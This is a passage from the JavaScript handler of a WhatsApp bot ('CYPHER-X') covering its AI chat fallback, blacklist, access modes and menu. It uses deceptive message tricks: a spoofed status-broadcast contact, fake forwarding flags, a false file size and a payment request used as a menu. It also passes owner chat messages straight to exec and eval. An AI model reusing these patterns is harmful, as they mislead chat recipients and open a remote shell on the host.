            const apiUrl = `https://bk9.fun/ai/GPT4o`;
            const params = {
                q: userMessage.trim(),
                userId: userId,
            };
            return axios.get(apiUrl, { params });
        };

        // Function to call the primary API
        const callPrimaryAPI = async () => {
            const apiUrl = `https://bk9.fun/ai/Llama3`;
            const params = {
                q: userMessage.trim(),
                userId: userId,
            };
            return axios.get(apiUrl, { params });
        };

        try {
            // Try calling the primary API
            const response = await callPrimaryAPI();
            const botResponse = response.data?.BK9;

            if (botResponse) {
                // Send the bot's response to the user
                await Cypher.sendMessage(m.chat, { text: `${botResponse}` }, { quoted: m });
            }
        } catch (primaryError) {
            console.error('Primary API request failed:', primaryError); // Log primary API-specific errors

            try {
                // Try calling the fallback API if the primary API fails
                const response = await callFallbackAPI();
                const botResponse = response.data?.BK9;

                if (botResponse) {
                    // Send the bot's response to the user
                    await Cypher.sendMessage(m.chat, { text: `${botResponse}` }, { quoted: m });
                }
            } catch (fallbackError) {
                console.error('Fallback API request failed:', fallbackError); // Log fallback API-specific errors
            }
        }
    } catch (err) {
        // Log other unexpected errors
        console.error('Error processing chatbot request:', err);
    }
}
//<================================================>//
//<================================================>//
//<================================================>// 
//=================================================//
//<================================================>//
//<================================================>//
//<================================================>// 
//=================================================//
//<================================================>//
const blacklistPath = path.join(__dirname, './src/blacklist.json');

function loadBlacklist() {
    try {
        if (!fs.existsSync(blacklistPath)) {
            fs.writeFileSync(blacklistPath, JSON.stringify({ blacklisted_numbers: [] }, null, 2));
        }
        const data = fs.readFileSync(blacklistPath);
        return JSON.parse(data);
    } catch (error) {
        console.error('Error loading blacklist:', error);
        return { blacklisted_numbers: [] };
    }
}
const userId = m.key.remoteJid;
const blacklist = loadBlacklist();

if (blacklist.blacklisted_numbers.includes(userId) && userId !== botNumber && !m.key.fromMe) {
        console.log("User is blacklisted:", userId);
        return;
    }
//=================================================//
//<================================================>//
if (global.mode === 'private') {
  if (command && !isCreator && !m.key.fromMe) return;
} else if (global.mode === 'group') {
  if (command && !m.isGroup && !isCreator && !m.key.fromMe) return;
} else if (global.mode === 'pm') {
  if (command && m.isGroup && !isCreator && !m.key.fromMe) return;
}
//<================================================// 
//mode checker
const modeStatus = 
  global.mode === 'public' ? "Public" : 
  global.mode === 'private' ? "Private" : 
  global.mode === 'group' ? "Group Only" : 
  global.mode === 'pm' ? "PM Only" : "Unknown";
//<================================================>// 
//================== [ FAKE REPLY ] ==================//
const fkontak = {
key: {
participants: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
fromMe: false,
id: "Halo"},
message: {
contactMessage: {
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
}},
participant: "0@s.whatsapp.net"
}

const reply = async(teks) => {
Cypher.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true
        }
      }, { quoted: m });
   }
   
const replys = async(teks) => {
m.reply(teks);
}

const reply2 = async(teks) => { 
Cypher.sendMessage(m.chat, { text : teks,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363345633217147@newsletter',
serverMessageId: 20,
newsletterName: '❃᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT'
},
externalAdReply: {
title: "᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT", 
body: "",
thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg", 
sourceUrl: null,
mediaType: 1
}}}, { quoted : m })
}
//=================================================//
const { pluginManager } = require('./core');
(async () => {

  const context = {
  Cypher, 
  m,        
  reply, 
  args,  
  quoted,
  fatkuns,  
  prefix,    
  command,
  text,    
  bad,   
  isCreator, 
  mess, 
  db,       
  botNumber, 
  modeStatus, 
  sleep,     
  isUrl,   
  versions, 
  full_args,
  setHerokuEnvVar,
  getHerokuEnvVars,
  deleteHerokuEnvVar,
  from,
  isAdmins,
  isBotAdmins,
  isGroupOwner,
  participants,
  q,
  store,
  sender,
  botname,
  ownername,
  ownernumber,
  fetchMp3DownloadUrl,
  fetchVideoDownloadUrl,
  saveStatusMessage,
  groupMetadata,
  fetchJson,
  acr,
  obfus,
  from,
  pushname,
  ephoto,
  loadBlacklist,
  blacklistPath, 
  Telesticker,
};

  // Process commands
  if (command) {
    try {
      const handled = await pluginManager.executePlugin(context, command);
    } catch (error) {
    console.error('Error executing command:', error.message);
    Cypher.sendMessage(Cypher.user.id, { text: `An error occurred while executing the command: ${error.message}` });
    }
  }
})();

switch (command) {
//=================================================//
case "menu":

const formatMemory = (memory) => {
    return memory < 1024 * 1024 * 1024
        ? Math.round(memory / 1024 / 1024) + ' MB'
        : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
};

const progressBar = (used, total, size = 10) => {
    let percentage = Math.round((used / total) * size);
    let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
    return `[${bar}] ${Math.round((used / total) * 100)}%`;
};

// **Generate Menu Function**
const generateMenu = (plugins, ownername, prefixz, modeStatus, versions, latensie, readmore) => {
    const memoryUsage = process.memoryUsage();
    const botUsedMemory = memoryUsage.heapUsed;
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    // Memory formatting function
    const formatMemory = (memory) => {
        return memory < 1024 * 1024 * 1024
            ? Math.round(memory / 1024 / 1024) + ' MB'
            : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
    };

    // Memory progress bar (System RAM usage)
    const progressBar = (used, total, size = 10) => {
        let percentage = Math.round((used / total) * size);
        let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
        return `[${bar}] ${Math.round((used / total) * 100)}%`;
    };

    // Count total unique commands across all plugins
    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]); // Add only the main command
            }
        });
    }
    totalCommands = uniqueCommands.size;

    let menu = `┏▣ ◈ *CYPHER-X* ◈\n`;
    menu += `┃ *ᴏᴡɴᴇʀ* : ${ownername}\n`;
    menu += `┃ *ᴘʀᴇғɪx* : [ ${prefixz} ]\n`;
    menu += `┃ *ʜᴏsᴛ* : ${os.platform()}\n`;
    menu += `┃ *ᴄᴏᴍᴍᴀɴᴅs* : ${totalCommands}\n`;
    menu += `┃ *ᴍᴏᴅᴇ* : ${modeStatus}\n`;
    menu += `┃ *ᴠᴇʀsɪᴏɴ* : ${versions}\n`;
    menu += `┃ *sᴘᴇᴇᴅ* : ${latensie.toFixed(4)} ms\n`;
    menu += `┃ *ᴜsᴀɢᴇ* : ${formatMemory(botUsedMemory)} of ${formatMemory(totalMemory)}\n`;
    menu += `┃ *ʀᴀᴍ:* ${progressBar(systemUsedMemory, totalMemory)}\n`;
    menu += `┗▣ \n${readmore}\n`;

    for (const category in plugins) {
        menu += `┏▣ ◈  *${category.toUpperCase()} MENU* ◈\n`;
        plugins[category].forEach(plugin => {
            if (plugin.command.length > 0) {
                menu += `│➽ ${plugin.command[0]}\n`;
            }
        });
        menu += `┗▣ \n\n`;
    }
    return menu;
};

const loadMenuPlugins = (directory) => {
    const plugins = {};

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginArray = require(filePath);
                
                const category = path.basename(file, '.js'); // Extract filename without extension
                if (!plugins[category]) {
                    plugins[category] = [];
                }

                plugins[category].push(...pluginArray); // Spread array to push each plugin individually
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
};

    const tylorkids = [tylorkid1, tylorkid2, tylorkid3, tylorkid4, tylorkid5][Math.floor(Math.random() * 5)];

    const startTime = performance.now();
    await m.reply("Loading menu...");
    const endTime = performance.now();
    const latensie = endTime - startTime;

    // Load plugins
    const plugins = loadMenuPlugins(path.resolve(__dirname, './src/Plugins'));

    const menulist = generateMenu(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);

    if (menustyle === '1') {
        Cypher.sendMessage(m.chat, {
            document: {
                url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
            },
            caption: menulist,
            mimetype: "application/zip",
            fileName: `${botname}`,
            fileLength: "9999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: "",
                    body: "",
                    thumbnail: tylorkids,
                    sourceUrl: plink,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: fkontak });
    } else if (menustyle === '2') {
        m.reply(menulist);
    } else if (menustyle === '3') {
        Cypher.sendMessage(m.chat, {
            text: menulist,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkids,
                    sourceUrl: plink,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });
    } else if (menustyle === '4') {
        Cypher.sendMessage(m.chat, {
            image: tylorkids,
            caption: menulist,
        }, { quoted: m });
     } else if (menustyle === '5') {
   let massage = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
              message: {
              interactiveMessage: {
              body: {
               text: null,            
                },
             footer: {
              text: menulist, 
                },
           nativeFlowMessage: {
           buttons: [{
             text: null
                   }], 
                  },
               },
             },
           },
         },{ quoted : m });
      Cypher.relayMessage(m.chat,massage.message,{ messageId: massage.key.id });
    } else if (menustyle === '6') {
        Cypher.relayMessage(m.chat, {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: '0@s.whatsapp.net',
                amount1000: '1',
                noteMessage: {
                    extendedTextMessage: {
                        text: menulist,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            externalAdReply: {
                                showAdAttribution: true,
                            },
                        },
                    },
                },
            },
        }, {});
    }
    break;
//<================================================>//

default: {
  if (budy.startsWith('$')) {
    if (!isCreator) return;
    exec(budy.slice(2), (err, stdout) => {
      if (err) return m.reply(err);
      if (stdout) return m.reply(stdout);
    });
  }

  if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
      let evaled = await eval(`(async () => { ${budy.slice(1)} })()`); // Use an IIFE
      if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
      await m.reply(evaled);
    } catch (err) {
      console.error(err); // Log the error to the console
      await m.reply(String(err));
    }
  }

  if (budy.startsWith('=>')) {
    if (!isCreator) return;

    function Return(sul) {
      let sat = JSON.stringify(sul, null, 2);
      let bang = util.format(sat);
      if (sat == undefined) {
        bang = util.format(sul);
      }
      return m.reply(bang);
    }
    try {
      const result = await eval(`(async () => { return ${budy.slice(3)} })()`); // Use an IIFE
      m.reply(util.format(result));
    } catch (e) {
      console.error(e); // Log the error to the console
      m.reply(String(e));
    }
  }
}

}
} catch (err) {
  let formattedError = util.format(err);
  let errorMessage = String(formattedError);

  if (shouldLogError(errorMessage)) {
    if (typeof err === 'string') {
      m.reply(`An error occurred:\n\nError Description: ${errorMessage}`);
    } else {
      console.log(formattedError);
      Cypher.sendMessage(Cypher.user.id, {
        text: `An error occurred:\n\nError Description: ${errorMessage}`,
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true
        }
      }, { ephemeralExpiration: 60 });
    }

    recordError(errorMessage);
  } else {
    console.log(`Repeated error suppressed: ${errorMessage}`);
  }
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(color(`Updated '${__filename}'`, 'red'))
  delete require.cache[file]
  require(file)
})